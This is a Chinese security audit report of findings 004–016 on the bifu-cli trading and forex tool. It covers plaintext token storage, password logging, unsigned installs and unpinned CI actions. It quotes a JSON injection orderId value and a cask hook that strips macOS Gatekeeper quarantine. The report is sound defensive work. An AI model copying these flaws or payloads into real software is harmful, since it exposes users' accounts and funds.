## \[BIFU\-CLI\-202606\-004\] 会话 cookie/token 明文存储（仅靠 0600 文件权限；Windows ACL 失效）

|**严重性: Medium**|维度: D7 加密 \+ D8 配置|OWASP: A02:2021 加密机制失效 / A04:2021 不安全设计|**优先级: P1**|
|---|---|---|---|
|文件: internal/clifconfig/config\.go:63,77\-78,161\-169||端点: auth login / auth login \-\-device（写入 config\.yaml 的 AuthCookie/UToken/VToken）||
|**人工复验: 已通过 ✔**  已确认：cookie/UToken/VToken 明文 yaml，Save 仅 0600/0700 无加密；Windows 上 0600 仅切只读位失效。||||

### 漏洞描述

AuthCookie/UToken/VToken 以 YAML 明文序列化，Save\(\) 仅 os\.WriteFile\(\.\.\.,0o600\)\+目录 0700，无加密层、无 OS keychain 集成。【第2轮补充】Windows ACL 失效：0o600/0o700 在 POSIX 正确，但 Windows 上 Go chmod 仅切只读位，文件对同机其他用户可读（本机为 win11）。建议 Windows 用 DPAPI/ACL，跨平台用 OS keychain。

### 影响分析

任何能读该文件的本机进程/备份系统/云同步（OneDrive/Time Machine）即可得会话；Windows 上同机其他用户可读。注：0600 是 CLI 业界惯例（gh/aws/kubectl 同此），故 Medium。

**系统风险: **无直接系统可用性威胁（本地存储泄露）。明文存储降低凭据保密性。

**资损风险: **本机进程/备份/云同步可读取明文会话 cookie→冒充用户交易/转账→资金盗取。可量化：任何能读 \~/\.bifu\-cli/config\.yaml 的进程即获全账户权限。

### 漏洞代码

type AuthProfile struct \{
    AuthCookie string \`yaml:"auth\_cookie"\`  // 明文
    UToken     string \`yaml:"u\_token"\`       // 明文
    VToken     string \`yaml:"v\_token"\`       // 明文
\}
func \(c \*CLIConfig\) Save\(\) error \{
    os\.MkdirAll\(dir, 0o700\)
    return os\.WriteFile\(ConfigPath\(\), data, 0o600\)   // 仅文件权限，无加密；Windows 仅切只读位
\}

### 数据流

auth login → cfg\.Save\(\) → YAML 明文序列化 cookie/token → \~/\.bifu\-cli/config\.yaml（0600）

### 利用场景

本机另一进程/备份/云同步读取 \~/\.bifu\-cli/config\.yaml → 获得会话 cookie → 冒充用户交易/转账

### 修复建议

**优先级: P1  \|  **集成 OS 凭据存储（macOS Keychain / Windows DPAPI / Linux libsecret），或至少 AES\-GCM 加密（密钥由 OS 派生）。

// 使用 99designs/keyring（跨平台）存储 cookie，config\.yaml 仅存非敏感配置
keyring\.Set\("bifu\-cli", profile\.Name\+"\-cookie", cookieVal\)

短期：AES\-GCM 加密 cookie 字段，密钥由机器 ID \+ 用户口令派生（PBKDF2）。

### 验证方法

- 1\. 打开 clifconfig/config\.go 确认 AuthCookie/UToken/VToken 为 yaml 明文字段

- 2\. 确认 Save\(\) 仅 0o600/0o700，无加密

- 3\. Grep keychain\|DPAPI\|AES\|encrypt 确认无凭据加密

**关联漏洞: **BIFU\-CLI\-202606\-002, BIFU\-CLI\-202606\-010, BIFU\-CLI\-202606\-025

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-005\] \-\-verbose 记录 POST body，forex 建账户密码明文入 stderr；文档谎称自动脱敏

|**严重性: Medium**|维度: D8 配置（敏感信息入日志）|OWASP: A09:2021 安全日志与监控失效 / A04:2021 不安全设计|**优先级: P1**|
|---|---|---|---|
|文件: internal/client/client\.go:159\-163、internal/api/payment/payment\.go:433、cmd/forex/forex\.go:98、docs/usage\-agents\.md:304||端点: 所有 spot/contract/payment 客户端的 HTTP 请求（verbose 开启时）；forex create\-account 的 POST body 含 Password||
|**人工复验: 已通过 ✔**  已确认：verbose 打印 POST body（含 forex Password）与响应体未脱敏，与 docs '自动脱敏' 承诺矛盾。||||

### 漏洞描述

verbose 对所有 spot/contract/payment 客户端生效，打印 method/URL/body/response body。CreateForexAccount 的 POST body 含 Password 字段 → \-v 时明文写入 stderr。响应体（余额/账户列表等金融 PII）同样被记录（500 字截断）。登录流程用独立 client 不走此 verbose（密码不入日志，此项安全）。【第2轮补充】文档与代码矛盾：docs/usage\-agents\.md:304 明确声称『\-v 日志自动脱敏』，但 client\.go:159\-163 对请求体未做任何脱敏，该承诺不成立（false sense of security）。且不止 forex 密码：全部 POST body（划转明细/订单体）与响应体均被记录。

### 影响分析

forex 账户密码明文入 stderr，可被 shell 历史/CI 日志/MCP 输出采集；响应体金融 PII 同样泄露；文档承诺误导用户以为安全。

**系统风险: **无直接系统风险（信息泄露到本地 stderr/日志）。

**资损风险: **forex 建账户密码明文入 stderr，可被日志采集/shell 历史捕获→forex 账户被登录操作。可量化：开启 \-v 调试即可能泄露 forex 账户密码，导致该外汇账户资金风险。

### 漏洞代码

if c\.Verbose \{
    fmt\.Fprintf\(os\.Stderr, "\[HTTP\] %s %s\\n", method, u\.String\(\)\)
    if bodyStr \!= "" \{ fmt\.Fprintf\(os\.Stderr, "\[HTTP\]   body: %s\\n", bodyStr\) \} // 含 forex Password，未脱敏
\}
// docs/usage\-agents\.md:304 \(与代码矛盾\): "\-v 日志自动脱敏"

### 数据流

cmd/forex Password → CreateForexAccount req → PostPayment body → client\.go:162 Fprintf\("\[HTTP\] body: %s"\) → stderr

### 利用场景

用户开启 \-v 调试 forex 建账户 → 密码明文入 stderr → 被 shell 历史/CI 日志/MCP 输出采集 → forex 账户被登录

### 修复建议

**优先级: P1  \|  **verbose 默认对 body 脱敏（按字段名 password/token/secret/cookie 掩码），或仅打印 status\+timing；修正 docs/usage\-agents\.md:304。

func redactBody\(bodyStr string\) string \{
    var m map\[string\]any
    if json\.Unmarshal\(\[\]byte\(bodyStr\), \&m\) == nil \{
        for k := range m \{
            lk := strings\.ToLower\(k\)
            if lk=="password"\|\|lk=="token"\|\|lk=="secret"\|\|lk=="cookie" \{ m\[k\]="\*\*\*" \}
        \}
        b,\_ := json\.Marshal\(m\); return string\(b\)
    \}
    return truncate\(bodyStr, 200\)
\}

verbose 仅打印 status\+timing\+URL，不打印 body；需要 body 调试时用单独 \-\-debug\-body 标志。

### 验证方法

- 1\. 打开 client\.go 确认 verbose 分支 Fprintf 打印请求 body 无脱敏

- 2\. 打开 payment\.go:433 确认 CreateForexAccount req 含 Password 并经 PostPayment

- 3\. 打开 docs/usage\-agents\.md:304 确认『\-v 日志自动脱敏』承诺与代码矛盾

- 4\. 确认登录用独立 client 不走 verbose

**关联漏洞: **BIFU\-CLI\-202606\-022

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-006\] MCP cancel 工具 JSON 输出注入（orderId 字符串拼接）

|**严重性: Low**|维度: D1 注入（输出注入）|OWASP: A03:2021 注入|**优先级: P2**|
|---|---|---|---|
|文件: internal/mcp/server\.go:194,208||端点: MCP cancel\_spot\_order / cancel\_contract\_order（返回值 JSON 构造）||
|**人工复验: 已通过 ✔**  已确认：两处 cancel 工具用字符串拼接 orderId 进 JSON，可致非法 JSON（反射回同调用方，低危）。||||

### 漏洞描述

两处 cancel 工具返回值用 \`\{"ok":true,"orderId":"\` \+ id \+ \`"\}\` 字符串拼接 id；orderId 来自 agent 输入，含 " 或 \\ 将产生非法 JSON / 输出注入。

### 影响分析

产生非法 JSON 工具返回，可能误导下游 agent 解析；反射回同一调用方，非存储/跨用户。

**系统风险: **仅产生非法 JSON 工具返回，可能误导下游 AI agent 解析；无系统级影响。

**资损风险: **无直接资损风险（orderId 反射回同一调用方，非存储/跨用户持久化）。

### 漏洞代码

return mcp\.NewToolResultText\(\`\{"ok":true,"orderId":"\` \+ id \+ \`"\}\`\), nil   // id 直接拼接

### 数据流

agent 传 orderId（含特殊字符） → 字符串拼接进 JSON → NewToolResultText → 非法/注入 JSON 返回

### 利用场景

agent 传 orderId=\`a","x":"y\` → 返回 \{"ok":true,"orderId":"a","x":"y"\} 非预期 JSON

### 修复建议

**优先级: P2  \|  **用 json\.Marshal 构造返回 JSON，杜绝字符串拼接。

b, \_ := json\.Marshal\(map\[string\]string\{"ok": "true", "orderId": id\}\)
return mcp\.NewToolResultText\(string\(b\)\), nil

### 验证方法

- 1\. 打开 server\.go:194,208 确认 cancel 工具用字符串拼接 orderId 进 JSON

- 2\. 构造含 " 的 orderId 调用确认产生非法 JSON

**关联漏洞: **BIFU\-CLI\-202606\-001

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-007\] WS URL 无 wss 强制，可 ws:// 明文传输私有交易流

|**严重性: Low**|维度: D7 加密 \+ D8 配置|OWASP: A02:2021 加密机制失效|**优先级: P2**|
|---|---|---|---|
|文件: internal/clifconfig/config\.go:248\-272、cmd/ws/ws\.go:97,108、config\_test\.go:165\-168||端点: ws 命令 / 私有 WS 流（GetWSPrivateURL/GetWSPrivateSpotURL）||
|**人工复验: 已通过 ✔**  已确认：私有 WS URL 接受 ws:// 原样返回，无强制 wss。||||

### 漏洞描述

GetWSMarketURL/GetWSPrivateURL/GetWSPrivateSpotURL 仅判断 ws://\|wss:// 前缀原样返回，无私有流强制 wss。config\_test\.go:165 断言 WSPrivate=wss://other 原样返回，确认同样接受 ws://。

### 影响分析

私有 WS 流（含会话 cookie、交易事件）可明文传输，被窃听。

**系统风险: **无直接系统风险。

**资损风险: **私有 WS 流（含会话 cookie、交易事件）明文传输可被窃听→会话/交易信息泄露，间接资损（可配合重放/观察）。可量化：中间人可观察到私有交易事件流。

### 漏洞代码

func \(p \*Profile\) GetWSPrivateURL\(\) string \{
    if strings\.HasPrefix\(p\.WSPrivate, "ws://"\) \|\| strings\.HasPrefix\(p\.WSPrivate, "wss://"\) \{
        return p\.WSPrivate   // ws:// 原样返回，无私有流强制 wss
    \}
    return p\.WebSocketURL \+ p\.WSPrivate
\}

### 数据流

config\.yaml WSPrivate=ws://\.\.\. → GetWSPrivateURL 原样返回 → wsclient 明文拨号 → 私有交易事件/cookie 明文

### 利用场景

配置 WSPrivate=ws:// → 私有交易事件流明文 → 中间人观察/重放

### 修复建议

**优先级: P2  \|  **私有 WS（WSPrivate/WSPrivateSpot）强制 wss://，拒绝或升级 ws://。

func \(p \*Profile\) GetWSPrivateURL\(\) string \{
    u := p\.WSPrivate
    if strings\.HasPrefix\(u, "ws://"\) \{ u = "wss://" \+ strings\.TrimPrefix\(u, "ws://"\) \}
    return u
\}

对 ws:// 私有流打印警告并拒绝连接。

### 验证方法

- 1\. 打开 clifconfig/config\.go 确认 GetWS\*URL 仅判前缀原样返回

- 2\. config\_test\.go:165 确认 WSPrivate 原样返回

- 3\. 确认 ws:// 同样被接受

**关联漏洞: **BIFU\-CLI\-202606\-003

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-008\] 安装/升级链下载二进制无 checksum/签名校验（三渠道）

|**严重性: Low**|维度: D10 供应链|OWASP: A06:2021 易受攻击与过时的组件 / A08:2021 完整性失效|**优先级: P2**|
|---|---|---|---|
|文件: install\.sh:47\-48、npm/install\.js:44\-53、cmd/upgrade\.go:84,146||端点: curl 安装 / npm install / bifu\-cli upgrade（下载 release 二进制）||
|**人工复验: 已通过 ✔**  已确认：三渠道下载即解压无 checksum/签名；checksums\.txt 生成但从不消费；npm 跟随 \<=10 重定向无 host 绑定。||||

### 漏洞描述

curl/https\.get 下载 release 后直接 tar \-xzf/\-xf 安装，全程无 sha256/GPG 校验。URL 指向 github\.com/decodeex/bifu\-cli\-releases（固定 HTTPS），依赖 HTTPS\+GitHub 信任锚。【第2轮补充】三渠道（install\.sh / npm/install\.js / cmd/upgrade\.go）均下载即执行无校验，且 \.goreleaser\.yaml:34 已生成 checksums\.txt 却从不被任何渠道消费；npm/install\.js:31\-49 跟随≤10次 Location 重定向无 host 绑定；cmd/upgrade\.go:84 仅检查版本并委托 install\.sh，不自带校验。第2轮评定为 High（分歧待 Phase 2 裁定）：金融软件 \+ 明文 cookie 窃取链（攻击链 B），发布渠道被控即大规模 RCE。

### 影响分析

MITM（极难，HTTPS）或仓库/账户被攻陷可投递任意二进制 → RCE（安装即获该用户权限），窃取 cookie。

**系统风险: **被投递的恶意 CLI 可任意操作——若部署在服务器/CI 中可致该主机沦陷；发布渠道被控可大规模感染所有安装用户。

**资损风险: **恶意 CLI 可窃取会话 cookie→全账户资金盗取。可量化：供应链投递成功即可获得运行该 CLI 的所有用户凭据。

### 漏洞代码

\# install\.sh
curl \-fsSL "$url" \-o "$tmp/$asset"   \# 下载后直接 tar \-xzf，无 sha256/签名
\# npm/install\.js
download\(url, tmp, \.\.\.\)                  \# 下载后 execFileSync\(tar \-xf\) 直接安装，无校验；跟随≤10次重定向

### 数据流

github release → curl/https\.get 下载 → tar 解压 → /usr/local/bin（sudo），无完整性校验

### 利用场景

仓库账户被攻陷或受信代理 MITM → 替换 release 二进制 → 用户安装 → 恶意 CLI 窃取 cookie

### 修复建议

**优先级: P2  \|  **发布并校验 \.sha256 校验和文件（checksums\.txt 已存在，需消费）；安装/升级前验证签名。

\# install\.sh
curl \-fsSL "$url\.sha256" \-o "$tmp/$asset\.sha256"
\(cd "$tmp" \&\& sha256sum \-c "$asset\.sha256"\) \|\| \{ echo "checksum failed"; exit 1; \}

使用 SRI/subresource 完整性或 GPG/cosign 签名验证。

### 验证方法

- 1\. 打开 install\.sh 确认 curl 后 tar \-xzf 无校验

- 2\. 打开 npm/install\.js 确认 download 后 tar \-xf 无校验，且跟随重定向

- 3\. 打开 cmd/upgrade\.go 确认仅检查版本委托 install\.sh

- 4\. Grep sha256\|gpg\|verify 确认安装链无完整性校验

**关联漏洞: **BIFU\-CLI\-202606\-015, BIFU\-CLI\-202606\-016, BIFU\-CLI\-202606\-020, BIFU\-CLI\-202606\-021

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-009\] ClientOrderID 嵌入 userID \+ 非密码学 timestamp 生成（可碰撞/去重）

|**严重性: Low**|维度: D8 配置（信息泄露）|OWASP: A04:2021 不安全设计|**优先级: P2**|
|---|---|---|---|
|文件: internal/clifconfig/config\.go:209\-219||端点: spot/contract 下单（GenerateClientOrderID 生成 clientOrderId）||
|**人工复验: 已通过 ✔**  已确认：ClientOrderID 嵌入 user\_id \+ 1 秒精度可预测时间戳，无 crypto/rand，同秒可碰撞去重。||||

### 漏洞描述

GenerateClientOrderID 用 fmt\.Sprintf\("%s\-%s\-\.\.\.", uid, \.\.\.\) 嵌入 userID；timestamp 为 UTC 格式（1 秒精度）可预测。每单把 user\_id 暴露给交易所。【第2轮补充】碰撞/去重角度：1 秒精度 \+ 同用户同品种同方向，同秒内两单产生相同 ClientOrderID，可能被服务端去重丢弃合法单（高频场景订单丢失/策略失效）或被关联追踪。建议后缀加 4\-6 位 crypto/rand hex。

### 影响分析

轻微信息泄露（user\_id 给交易所）\+ 可预测订单 ID \+ 同秒碰撞致订单丢失风险。

**系统风险: **无。

**资损风险: **无直接资损风险（仅信息泄露 user\_id 给交易所；timestamp 可预测，非安全场景）。间接：同秒碰撞可能致合法订单被去重丢弃。

### 漏洞代码

id := fmt\.Sprintf\("%s\-%s\-%s\-%s", uid, strings\.ToLower\(symbol\), strings\.ToLower\(side\),
    ts\.UTC\(\)\.Format\("20060102150405"\)\)   // 每单暴露 user\_id \+ 可预测 timestamp \+ 1秒精度可碰撞

### 数据流

Profile\.Auth\.UserID → GenerateClientOrderID → clientOrderId → 交易所（暴露 user\_id）

### 利用场景

交易所/观察者从 clientOrderId 提取 user\_id；同秒同品种同方向两单 ID 碰撞

### 修复建议

**优先级: P2  \|  **clientOrderId 不嵌入 user\_id；如需唯一性用 crypto/rand 生成或哈希，并加随机后缀防碰撞。

b := make\(\[\]byte, 8\); crypto/rand\.Read\(b\)
id := hex\.EncodeToString\(b\) \+ "\-" \+ strings\.ToLower\(symbol\)

保留可读性但用 HMAC\(uid, symbol, ts, serverSecret\) 替代明文 uid。

### 验证方法

- 1\. 打开 clifconfig/config\.go:209 确认 GenerateClientOrderID 嵌入 uid

- 2\. 确认 timestamp 为可预测 UTC 格式（1 秒精度）

- 3\. Grep crypto/rand 确认无随机分量

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-010\] UToken/VToken 死字段可写但无消费

|**严重性: Low**|维度: D8 配置|OWASP: A04:2021 不安全设计 / A06:2021 易受攻击组件|**优先级: P3**|
|---|---|---|---|
|文件: internal/clifconfig/config\.go:77\-78||端点: config set \-\-u\-token / \-\-v\-token（写入但无客户端读取）||
|**人工复验: 已通过 ✔**  已确认：UToken 仅 config set 可写、VToken 无 setter，二者无任何 HTTP/WS 客户端读取（死字段）。||||

### 漏洞描述

UToken/VToken 可经 config set 写入但无任何 HTTP/WS 客户端读取应用（死字段）。config get 不掩码。

### 影响分析

配置臃肿 \+ 误导 \+ 轻微信息泄露（config get 展示）。

**系统风险: **无。

**资损风险: **无直接资损风险（死字段，无任何客户端读取/消费）。

### 漏洞代码

type AuthProfile struct \{
    UToken string \`yaml:"u\_token"\`   // 可写，无消费
    VToken string \`yaml:"v\_token"\`   // 可写，无消费
\}

### 数据流

config set \-\-u\-token → 写入 config\.yaml → 无任何客户端读取

### 利用场景

N/A（死字段，无利用面）

### 修复建议

**优先级: P3  \|  **删除 UToken/VToken 字段，或在接入网关 token 认证前移除写入入口。

// 删除 AuthProfile 中的 UToken/VToken 字段及对应 config set 标志

若计划接入，补充 HTTP/WS 客户端的 token 应用逻辑并在 config get 掩码。

### 验证方法

- 1\. 打开 clifconfig/config\.go 确认 UToken/VToken 字段

- 2\. Grep UToken\|VToken\|u\_token\|v\_token 确认无客户端读取

**关联漏洞: **BIFU\-CLI\-202606\-004

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-011\] upgrade 用 sh \-c，Windows 无 sh 失败（功能性）

|**严重性: Info**|维度: D1 注入（已排除）\+ 可移植性|OWASP: N/A（功能性）|**优先级: P3**|
|---|---|---|---|
|文件: cmd/upgrade\.go:146||端点: bifu\-cli upgrade（exec\.Command sh \-c）||
|**人工复验: 已通过 ✔**  已确认：upgrade exec sh \-c 用固定串无注入（\#nosec G204 成立），但 Windows 无 sh 致升级失败（功能性）。||||

### 漏洞描述

exec\.Command\("sh","\-c",command\) 的 command 为 installMethod\(\) 三选一固定串（无注入，\#nosec G204 成立），但 Windows 上 sh 不存在导致升级失败。

### 影响分析

Windows 用户升级失败（功能性，非安全）。

**系统风险: **无安全系统风险（功能性缺陷：Windows 上 sh 不存在导致升级失败）。

**资损风险: **无直接资损风险。

### 漏洞代码

c := exec\.Command\("sh", "\-c", command\) // command 固定串，无注入；但 Windows 无 sh

### 利用场景

N/A（无注入面；\#nosec G204 理由成立）

### 修复建议

**优先级: P3  \|  **Windows 上用 cmd /c 或直接调用对应包管理器（npm/brew/scoop）而非 sh \-c。

if runtime\.GOOS == "windows" \{
    c = exec\.Command\("cmd", "/c", command\)
\} else \{
    c = exec\.Command\("sh", "\-c", command\)
\}

按 installMethod 返回的 \(程序, 参数列表\) 直接 exec，不经过 shell。

### 验证方法

- 1\. 打开 cmd/upgrade\.go:146 确认 exec\.Command\("sh","\-c",command\)

- 2\. 确认 command 为 installMethod\(\) 固定串（无注入）

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-012\] QR device 登录 issueID 在 URL 明文路径 \+ 2min 轮询窗口

|**严重性: Info**|维度: D2 认证|OWASP: A07:2021 身份认证失效|**优先级: P3**|
|---|---|---|---|
|文件: cmd/auth/login\.go:225,239||端点: auth login \-\-device（QR 扫码登录）||
|**人工复验: 已通过 ✔**  已确认：QR issueID 拼入 URL 路径 \+ 2min 轮询窗，需 MITM 观察且单次使用。||||

### 漏洞描述

QR device 流程 scanURL 拼 WebURL\+/x/\+issueID，issueID 进 URL 路径；轮询 deadline 2min。网络观察者（需 MITM）可见 issueID（单次使用、2min 窗口）。

### 影响分析

低——issueID 单次使用、2min 窗口、需 MITM 才能观察到。

**系统风险: **无。

**资损风险: **无直接资损风险（issueID 单次使用、2min 窗口、需 MITM 才能观察到）。

### 漏洞代码

scanURL = strings\.TrimRight\(profile\.WebURL, "/"\) \+ "/x/" \+ issueID  // issueID 进 URL 路径
deadline := time\.Now\(\)\.Add\(2 \* time\.Minute\)                          // 2min 轮询窗口

### 数据流

qr\_code\_get → issueID → 拼 scanURL（/x/issueID）→ 网络（MITM 可见）→ qr\_code\_check 轮询 2min

### 利用场景

MITM 观察 /x/issueID 路径获取 issueID（单次、2min 窗口，低影响）

### 修复建议

**优先级: P3  \|  **确保 WebURL 强制 https；issueID 不放 URL 路径（改 POST body 或 fragment）。

// scanURL 用 fragment 携带 issueID，不进服务器日志路径
scanURL = strings\.TrimRight\(profile\.WebURL, "/"\) \+ "/x/\#" \+ issueID

issueID 经 qr\_code\_check 的 POST body 传递，URL 不携带。

### 验证方法

- 1\. 打开 cmd/auth/login\.go:225 确认 scanURL 拼 /x/\+issueID

- 2\. :239 确认 2min deadline

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-013\] CLI 交易命令无预登录闸门 \+ \#nosec 抑制建议复核

|**严重性: Info**|维度: D2 认证 \+ D8 配置|OWASP: A07:2021 身份认证失效|**优先级: P3**|
|---|---|---|---|
|文件: cmd/root\.go:104\-129、cmd/auth/login\.go:417、internal/clifconfig/config\.go:137||端点: 所有 CLI 命令（PersistentPreRun loadCtx 无预认证检查）||
|**人工复验: 已通过 ✔**  已确认：loadCtx 无预登录闸门（返 401，UX）；三处 \#nosec（G117/G304/G204）理由复核成立。||||

### 漏洞描述

loadCtx 不检查 AuthCookie 是否为空，未登录执行交易命令直接打后端→401（UX 而非安全）。三处 \#nosec（G117 密码 marshal / G304 自有 config 路径 / G204 固定 exec 参数）当前理由成立，建议定期复核。

### 影响分析

未登录请求被后端 401 拒绝（UX）；\#nosec 抑制需定期复核以防后续代码变更使其失效。

**系统风险: **无（未登录请求被后端 401 拒绝）。

**资损风险: **无直接资损风险（未登录执行交易命令直接返 401，UX 而非安全）。

### 漏洞代码

// cmd/root\.go — loadCtx 无预登录闸门（未登录 → 后端 401）
// 三处 \#nosec（G117/G304/G204）当前理由成立，建议定期复核

### 利用场景

N/A（未登录被后端拒绝）

### 修复建议

**优先级: P3  \|  **交易类命令在 loadCtx 检查 AuthCookie 非空，未登录时客户端直接拒绝并提示登录；建立 \#nosec 定期复核流程。

if p\.Auth\.AuthCookie == "" \&\& requiresAuth\(cmd\) \{
    return fmt\.Errorf\("not logged in — run \`bifu\-cli auth login\`"\)
\}

至少对下单/转账命令加客户端预检，减少无效后端请求。

### 验证方法

- 1\. 打开 cmd/root\.go PersistentPreRun 确认 loadCtx 不检查 AuthCookie

- 2\. 复核三处 \#nosec 理由是否仍成立

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-014\] 外汇/支付金额用 float64（精度损失），与现货/合约 string 类型不一致

|**严重性: High**|维度: D9 业务逻辑|OWASP: A04:2021 不安全设计|**优先级: P1**|
|---|---|---|---|
|文件: internal/api/payment/payment\.go:126\-130,164\-166,172; cmd/forex/forex\.go:191,244\-247||端点: forex order create/modify/close \+ payment 划转||
|**人工复验: 已通过 ✔**  已确认：外汇/支付 Volume/Price/SL/TP 为 float64，与现货/合约 string 不一致，IEEE754 精度隐患。||||

### 漏洞描述

外汇下单/改单/平单的 Volume/Price/SL/TP、划转 Amount 用 float64（payment\.go:126 Volume, 128 Price, 129 SL, 130 TP, 164\-166 Modify, 172 Close Volume）。IEEE754 无法精确表示十进制小数，JSON 序列化存在舍入漂移。对照：现货/合约正确使用 string（spot\.go:36\-37, contract\.go:39\-40），外汇路径是唯一不一致。

### 影响分析

外汇订单尺寸/止损止盈位/划转金额偏差，可能被服务端拒绝或产生异常撮合。

**系统风险: **精度损失导致订单参数与服务端预期不一致，可能触发服务端拒绝或异常撮合记录；数据一致性风险中等。单账户范围。

**资损风险: **外汇手数/价格/止损止盈/划转金额舍入漂移 → 订单尺寸偏差、止损位偏移（止损止盈失效放大亏损）、划转金额少转/多转。最坏：高频场景累积精度误差或 SL/TP 失效放大亏损。

### 漏洞代码

// internal/api/payment/payment\.go:126\-130
type CreateForexOrderReq struct \{
    Volume float64 \`json:"volume"\`
    Price  float64 \`json:"price"\` // 0 = market
    SL     float64 \`json:"sl"\`
    TP     float64 \`json:"tp"\`
\}
// 对照 spot\.go:36\-37: Price/Size 为 string

### 数据流

CLI flag\(Float64Var\) → float64 字段 → json\.Marshal \(IEEE754 舍入\) → POST body

### 利用场景

传 volume=0\.3 \(实际 0\.299999999999999988\.\.\.\) → 序列化后尺寸漂移，SL/TP 同理偏移

### 修复建议

**优先级: P1  \|  **外汇路径金额字段统一改 string \+ 定点库（或 int64 固定小数位），与现货/合约对齐。

type CreateForexOrderReq struct \{
    Volume string \`json:"volume"\` // 改 string，用 shopspring/decimal 解析
    Price  string \`json:"price"\`
    SL     string \`json:"sl"\`
    TP     string \`json:"tp"\`
\}

### 验证方法

- 1\. 读 internal/api/payment/payment\.go:123\-143，确认 Volume/Price/SL/TP 为 float64

- 2\. 读 internal/api/spot/spot\.go:36\-37 与 contract\.go:39\-40，确认为 string（不一致）

- 3\. Grep float64 在 internal/api/payment/payment\.go 命中数量

**关联漏洞: **BIFU\-CLI\-202606\-001

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-015\] 发布产物未签名 \+ Homebrew cask 显式剥离 macOS Gatekeeper 隔离

|**严重性: High**|维度: D10 供应链|OWASP: A08:2021 Software \& Data Integrity Failures|**优先级: P0**|
|---|---|---|---|
|文件: \.goreleaser\.yaml:34,64\-69||端点: GitHub Release 产物 \+ Homebrew cask||
|**人工复验: 已通过 ✔**  已确认：goreleaser 无 sign 段（grep cosign/gpg 0 命中），cask 显式 xattr \-dr 剥离 Gatekeeper 隔离。||||

### 漏洞描述

\.goreleaser\.yaml 有 checksum: 块（34 行）但无 sign: 块 —— 无 cosign/gpg 签名、无 SLSA provenance。Homebrew cask post\.install（64\-69 行）运行 xattr \-dr com\.apple\.quarantine 显式剥离 macOS Gatekeeper 隔离。

### 影响分析

用户无法独立验证产物来源；macOS 上故意绕过系统下载文件检查，篡改/伪造二进制无警示运行。

**系统风险: **用户无法验证产物完整性/来源；macOS 故意绕过 Gatekeeper 使恶意/篡改二进制无警示运行，削弱终端完整性。

**资损风险: **与 008 叠加；伪造成官方更新即可植入盗号木马。最坏：定向分发恶意版本窃取特定用户资金。

### 漏洞代码

\# \.goreleaser\.yaml:34 — 有 checksum 无 sign
checksum:
  name\_template: 'checksums\.txt'
\# \.goreleaser\.yaml:64\-69 — cask 剥离隔离
hooks:
  post:
    install: \|
      xattr \-dr com\.apple\.quarantine "\#\{staged\_path\}"

### 数据流

未签名产物 → 用户安装 → macOS Gatekeeper 本应隔离但被 cask 剥离 → 直接运行

### 利用场景

攻击者发布伪造/篡改版本 → Homebrew 用户安装 → cask 自动剥离 quarantine → 无警示运行恶意二进制

### 修复建议

**优先级: P0  \|  **增加 sign: 块（cosign/Sigstore keyless \+ OIDC）；移除 cask quarantine 剥离或改为签名后保留。

\# \.goreleaser\.yaml 增加:
signs:
  \- cmd: cosign
    args: \['sign\-blob', '\-\-yes', '\-\-output\-signature', '$\{artifact\}\.sig', '$\{artifact\}'\]
\# 移除 cask post\.install 的 xattr \-dr

### 验证方法

- 1\. 读 \.goreleaser\.yaml 全文，确认有 checksum: 无 sign:

- 2\. 读 \.goreleaser\.yaml:60\-70（cask hooks），确认 xattr \-dr com\.apple\.quarantine

- 3\. Grep sign\|cosign\|gpg\|sigstore 在 \.goreleaser\.yaml 应为 0

**关联漏洞: **BIFU\-CLI\-202606\-008, BIFU\-CLI\-202606\-016

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-016\] release\.yml: 单一宽权限 PAT 跨两外部仓库 \+ GitHub Actions 浮动标签未 SHA 固定

|**严重性: High**|维度: D10 供应链|OWASP: A08:2021 Software \& Data Integrity Failures / A05:2021 Security Misconfiguration|**优先级: P1**|
|---|---|---|---|
|文件: \.github/workflows/release\.yml:8\-9,23\-25,34\-35; ci\.yml; pages\.yml||端点: CI/CD 发布流水线（npm \+ homebrew\-tap \+ GitHub Release）||
|**人工复验: 已通过 ✔**  已确认：单一宽 PAT 跨两仓库，所有 Actions 浮动标签 \+ goreleaser latest。补充：ci\.yml/pages\.yml 权限本身最小化。||||

### 漏洞描述

GITHUB\_TOKEN/HOMEBREW\_TAP\_GITHUB\_TOKEN 为同一 PAT，同时写 bifu\-cli\-releases 与 homebrew\-tap；permissions: contents: write；actions/checkout@v7、setup\-go@v6、goreleaser\-action@v7（version: latest）等全部浮动主版本标签，非 commit SHA。

### 影响分析

PAT 泄露或上游 Action 标签被强推 → 三渠道构建投毒。

**系统风险: **PAT 泄露或 Action 标签被劫持 → 构建链投毒 → 三渠道（npm/homebrew/curl）同时分发恶意版本，平台级沦陷。

**资损风险: **同 008 —— 构建产物被植入 → 全量用户 RCE \+ cookie 盗取。最坏：全量资金风险。

### 漏洞代码

\# \.github/workflows/release\.yml
permissions:
  contents: write      \# :8\-9
HOMEBREW\_TAP\_GITHUB\_TOKEN: $\{\{ secrets\.\* \}\}  \# 同一 PAT 写两仓库 :34
\- uses: goreleaser/goreleaser\-action@v7  \# 浮动标签 :23
  with:
    version: latest    \# :24 非固定

### 数据流

tag push → release\.yml（contents:write \+ PAT）→ goreleaser\-action@v7（浮动）→ 发布到 releases \+ homebrew\-tap \+ npm

### 利用场景

场景A: PAT 泄露 → 攻击者直接推恶意 release 到两仓库
场景B: 上游 goreleaser\-action@v7 标签被劫持 → 构建期执行恶意代码 → 投毒产物

### 修复建议

**优先级: P1  \|  **每个外部仓库独立最小权限 token；Actions 全部 SHA 固定；goreleaser\-action 固定具体版本；启用 OIDC trusted publishing。

\# 所有 actions 改 SHA 固定:
\- uses: actions/checkout@\<full\-40\-char\-sha\>
\# goreleaser\-action 固定版本:
\- uses: goreleaser/goreleaser\-action@v7\.1\.0
  with: \{ version: v2\.4\.8 \}   \# 非 latest
